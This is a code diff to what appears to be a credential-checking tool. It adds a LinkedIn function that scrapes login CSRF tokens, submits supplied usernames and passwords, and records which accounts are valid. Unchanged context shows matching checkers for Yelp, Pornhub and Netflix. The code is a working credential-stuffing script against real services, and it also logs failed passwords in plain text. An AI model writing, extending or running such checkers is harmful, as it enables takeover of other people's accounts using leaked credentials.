@@ -21,6 +21,39 @@ import logging as log
 #                                 cookies=cookies)
 #     print(res.content)
 
+
+def linkedin(usr, pwd, mr):
+    mr : ManageRequests
+    get_url = "https://www.linkedin.com/login"
+    post_url = "https://www.linkedin.com/checkpoint/lg/login-submit"
+
+    # Get main page with tokens
+    res = mr.req.get(get_url, headers={'User-Agent': 'Mozilla/5.0'})
+    # Filter out tokens
+    soup = BeautifulSoup(res.text, features="html.parser")
+    csrfToken = soup.find('input', attrs={'name': 'csrfToken'})['value']
+    sIdString = soup.find('input', attrs={'name': 'sIdString'})['value']
+    loginCsrfParam = soup.find('input', attrs={'name': 'loginCsrfParam'})['value']
+
+    # Post request to login
+    res = mr.post_with_checks(post_url,
+                              data={'session_key': usr,
+                                    'session_password': pwd,
+                                    'csrfToken': csrfToken,
+                                    'sIdString': sIdString,
+                                    'loginCsrfParam': loginCsrfParam,
+                                    })
+
+    if 'login' not in res.url:
+        mr.db.update_result(usr, pwd, "linkedin", "True")
+        log.info("Account valid {}".format(usr))
+    else:
+        mr.db.update_result(usr, pwd, "linkedin", "False")
+        log.info("Account error {} {}".format(usr, pwd))
+    log.info("-------------------------------")
+    mr.req.cookies.clear()
+
+
 def yelp(usr, pwd, mr):
     mr : ManageRequests
     site_url = "https://www.yelp.co.uk/login"
@@ -46,6 +79,7 @@ def yelp(usr, pwd, mr):
         log.info("Account error {} {}".format(usr, pwd))
     log.info("-------------------------------")
     mr.req.cookies.clear()
+
 
 def pornhub(usr, pwd, mr):
     mr : ManageRequests
@@ -79,6 +113,7 @@ def pornhub(usr, pwd, mr):
         log.info("Account error {} {}".format(usr, pwd))
     log.info("-------------------------------")
     mr.req.cookies.clear()
+
 
 def netflix(usr, pwd, mr):
     mr : ManageRequests
